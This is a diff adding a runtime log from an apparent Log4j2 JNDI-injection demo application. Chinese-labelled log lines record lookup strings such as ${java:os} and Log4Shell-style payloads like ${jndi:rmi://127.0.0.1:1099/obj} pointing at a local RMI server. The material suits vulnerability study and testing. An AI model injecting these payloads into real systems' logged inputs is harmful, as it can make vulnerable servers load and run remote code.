@@ -1,0 +1,18 @@
+19:14:10.278 [main] INFO  com.ppfly.log4j2jndildap.Log4j2jndildapApplication - Starting Log4j2jndildapApplication using Java 1.8.0_211 on public-007 with PID 22380 (D:\demo\ppfly-log4j2jndildap-demo\target\classes started by public-007 in D:\demo\ppfly-log4j2jndildap-demo)
+19:14:10.326 [main] INFO  com.ppfly.log4j2jndildap.Log4j2jndildapApplication - No active profile set, falling back to default profiles: default
+19:14:11.996 [main] INFO  com.ppfly.log4j2jndildap.Log4j2jndildapApplication - Started Log4j2jndildapApplication in 2.151 seconds (JVM running for 4.698)
+19:14:12.266 [http-nio-8080-exec-1] INFO  com.ppfly.log4j2jndildap.Log4j2jndildapApplication - 正常打印信息：zhangsan
+19:14:12.266 [http-nio-8080-exec-1] INFO  com.ppfly.log4j2jndildap.Log4j2jndildapApplication - 打印系统硬件信息：${java:hw}
+19:14:12.266 [http-nio-8080-exec-1] INFO  com.ppfly.log4j2jndildap.Log4j2jndildapApplication - 打印操作系统信息：${java:os}
+19:14:12.266 [http-nio-8080-exec-1] INFO  com.ppfly.log4j2jndildap.Log4j2jndildapApplication - jndi rmi注入：${jndi:rmi://127.0.0.1:1099/obj}
+19:14:12.266 [http-nio-8080-exec-1] INFO  com.ppfly.log4j2jndildap.Log4j2jndildapApplication - boom，boom，boom：${jndi:rmi://127.0.0.1:1199/boom}
+19:14:16.401 [http-nio-8080-exec-2] INFO  com.ppfly.log4j2jndildap.Log4j2jndildapApplication - 正常打印信息：zhangsan
+19:14:16.401 [http-nio-8080-exec-2] INFO  com.ppfly.log4j2jndildap.Log4j2jndildapApplication - 打印系统硬件信息：${java:hw}
+19:14:16.401 [http-nio-8080-exec-2] INFO  com.ppfly.log4j2jndildap.Log4j2jndildapApplication - 打印操作系统信息：${java:os}
+19:14:16.402 [http-nio-8080-exec-2] INFO  com.ppfly.log4j2jndildap.Log4j2jndildapApplication - jndi rmi注入：${jndi:rmi://127.0.0.1:1099/obj}
+19:14:16.402 [http-nio-8080-exec-2] INFO  com.ppfly.log4j2jndildap.Log4j2jndildapApplication - boom，boom，boom：${jndi:rmi://127.0.0.1:1199/boom}
+19:16:52.034 [http-nio-8080-exec-6] INFO  com.ppfly.log4j2jndildap.Log4j2jndildapApplication - 正常打印信息：zhangsan
+19:16:52.035 [http-nio-8080-exec-6] INFO  com.ppfly.log4j2jndildap.Log4j2jndildapApplication - 打印系统硬件信息：${java:hw}
+19:16:52.035 [http-nio-8080-exec-6] INFO  com.ppfly.log4j2jndildap.Log4j2jndildapApplication - 打印操作系统信息：${java:os}
+19:16:52.035 [http-nio-8080-exec-6] INFO  com.ppfly.log4j2jndildap.Log4j2jndildapApplication - jndi rmi注入：${jndi:rmi://127.0.0.1:1099/obj}
+19:16:52.035 [http-nio-8080-exec-6] INFO  com.ppfly.log4j2jndildap.Log4j2jndildapApplication - boom，boom，boom：${jndi:rmi://127.0.0.1:1199/boom}
